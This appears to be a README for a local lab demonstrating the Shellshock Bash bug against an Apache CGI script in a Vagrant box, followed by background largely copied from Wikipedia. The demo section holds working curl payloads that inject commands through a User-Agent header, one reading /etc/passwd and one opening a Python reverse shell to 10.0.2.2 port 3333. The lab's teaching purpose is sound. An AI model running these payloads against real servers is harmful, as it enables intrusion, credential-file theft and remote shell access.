# Getting started on demoing a Shellshock vulnerability: 

## Setup
  1. Set up a vagrant box using this vagrant file. This will install Apache and forward to port 8080.. 
  2. Create a cgi file in /usr/lib/cgi-bin. It can be as simple as html content type "hello world."  
  3. Test the following vulnerabilities against http://localhost:8080/cgi-bin/somefileofyourchoice.sh 


## Demoing the vulnerability
### To test via the command line: 

```sh
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

(If you see "vulnerable" you need to update bash. Otherwise, you should be good to go.)


#### Via curl: 

#### To just echo data:

```sh
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'hi world of exploits'" http://localhost:8080/cgi-bin/shellshock_test.sh
```

#### To copy passwords: 
```sh
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/shellshock_test.sh
```

#### To create a reverse shell:
```sh
curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
```


## More information about Shellshock: 
Source: https://en.wikipedia.org/wiki/Shell_shock

This is a major vulnerability that occurs when specific characters are included as part of a variable definition in Bash.

Function definitions are exported by encoding them within the environment variable list as variables whose values begin with parentheses ("()") followed by a function definition. 

If the characters "{ :;};" are included as the function definition, any arbitrary code that is inserted AFTER that definition is processed. This isn't supposed to happen.




### Scale of the problem: 

It looks like basically every version of Bash through version 4.3 is affected by this vulnerability.


### Why is CGI vulnurable? 

The Common Gateway Interface (CGI) vector (an interface between a web server and executables that produce dynamic content) has received the bulk of the focus from attackers thus far. However, the reach of the BASH Shellshock bug doesn’t stop at web servers. Any application that relies on user-controlled data to set OS-level environment variables and then invokes the shell from that same context can trigger the vulnerability. In other words, web applications relying on a specific type of user input can be manipulated to make clients (i.e., consumers) vulnerable to attack. 

Because CGI relies on environment variables set in the header which are later interpreted to generate dynamic content, it is vulnerable to this kind of attack. 

### More about Bash: 

In Unix-based operating systems, and in other operating systems that Bash supports, each running program has its own list of name/value pairs called environment variables. When one program starts another program, it provides an initial list of environment variables for the new program.[21]Separately from these, Bash also maintains an internal list of functions, which are named scripts that can be executed from within the program.[22]Since Bash operates both as a command interpreter and as a command, it is possible to execute Bash from within itself. When this happens, the original instance can export environment variables and function definitions into the new instance.[23] Function definitions are exported by encoding them within the environment variable list as variables whose values begin with parentheses ("()") followed by a function definition. The new instance of Bash, upon starting, scans its environment variable list for values in this format and converts them back into internal functions. It performs this conversion by creating a fragment of code from the value and executing it, thereby creating the function "on-the-fly", but affected versions do not verify that the fragment is a valid function definition.[24] Therefore, given the opportunity to execute Bash with a chosen value in its environment variable list, an attacker can execute arbitrary commands or exploit other bugs that may exist in Bash's command interpreter.

When a web server uses the Common Gateway Interface (CGI) to handle a document request, it passes various details of the request to a handler program in the environment variable list. For example, the variable HTTP_USER_AGENT has a value that, in normal usage, identifies the program sending the request. If the request handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted server request.[6]
Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked."[29] and other methods of handling web server requests are often used. There are a number of online services which attempt to test the vulnerability against web servers exposed to the Internet.
